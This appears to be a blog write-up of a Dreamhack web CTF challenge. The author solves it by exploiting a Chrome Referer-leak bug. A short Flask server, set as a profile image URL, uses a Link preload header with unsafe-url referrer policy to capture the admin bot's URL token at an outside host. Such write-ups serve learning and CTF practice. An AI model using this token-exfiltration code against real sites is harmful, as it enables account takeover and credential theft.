---
title: ShareProfile Revenge
date: 2025-10-13 10:00:00 +0800
categories: [Cybersecurity]
tags: [dreamhack, web]
description: Level 5 web exploitation challenge on Dreamhack.io
---

### The Challenge
[https://dreamhack.io/wargame/challenges/2348](https://dreamhack.io/wargame/challenges/2348)

![](/assets/img/posts/shareprofile-revenge/img1.png)
*Challenge description reveals... NOTHING*

Reading through `app.py`, I need to become admin to get the flag.

Users are authenticated in a strange way on the index page (which also has the "XSS" vector).

When users view the "XSS" content, their token is in the URL query parameters.

This page is also the page which the admin bot visits when you send a report.

```py
@app.route("/")
def index():
    db = get_db()
    profiles = db.execute("SELECT username, description, image FROM profiles ORDER BY id DESC").fetchall()

    token = request.args.get("token")
    if token and verify_token(token):
        return render_template("index.html", profiles=profiles, is_logged_in=True)
    return render_template("index.html", profiles=profiles, is_logged_in=False)
```

```html
<div class="profile">
    <img src="{{ profile.image }}" alt="Profile Image" class="profile-image">
    <div class="profile-info">
        <h2 class="profile-username">{{ profile.username }}</h2>
        <p class="profile-description">{{ profile.description }}</p>
    </div>
</div>
```

No obvious XSS here. Through some prompting and thinking, I came up with an idea - what if we could put our own URL in `profile.image`, and get the admin's token through the `Referer` header?

Usually, it's not possible for cross-origin requests to include the URL query string in the `Referer` header due to a strict default `referrer-policy`.

However, the version of chromedriver used is actually vulnerable!

```dockerfile
# install google chrome
RUN wget -O ./google-chrome-stable.deb https://mirror.cs.uchicago.edu/google-chrome/pool/main/g/google-chrome-stable/google-chrome-stable_130.0.6723.116-1_amd64.deb && \
    apt-get install -y ./google-chrome-stable.deb && \
    rm ./google-chrome-stable.deb

# install chromedriver
RUN wget -O ./chromedriver.zip https://storage.googleapis.com/chrome-for-testing-public/130.0.6723.116/linux64/chromedriver-linux64.zip && \
    unzip chromedriver.zip -d /usr/local/bin/ && \
    mv /usr/local/bin/chromedriver-linux64/chromedriver /usr/local/bin/chromedriver && \
    rm ./chromedriver.zip
```

A quick search for "chromium bug query string leak" brought me to this chromium report: [https://issues.chromium.org/issues/415810136](https://issues.chromium.org/issues/415810136)

Solving was straightforward after finding this vuln. I set `profile.image` to my own flask app running this code:

```py
stuffz = []

@app.route('/image')
def image():
    response = make_response()
    response.headers['Link'] = '<https://my-website.com/bruh>; rel="preload"; as="image"; referrerpolicy="unsafe-url"'
    return response

@app.route("/stuff")
def stuff():
    return str(stuffz)

@app.route("/bruh")
def bruh():
    print(request.headers)
    stuffz.append(request.headers.get("Referer", "None"))
    return 'ok'
```

![](/assets/img/posts/shareprofile-revenge/img2.png)
*Win!*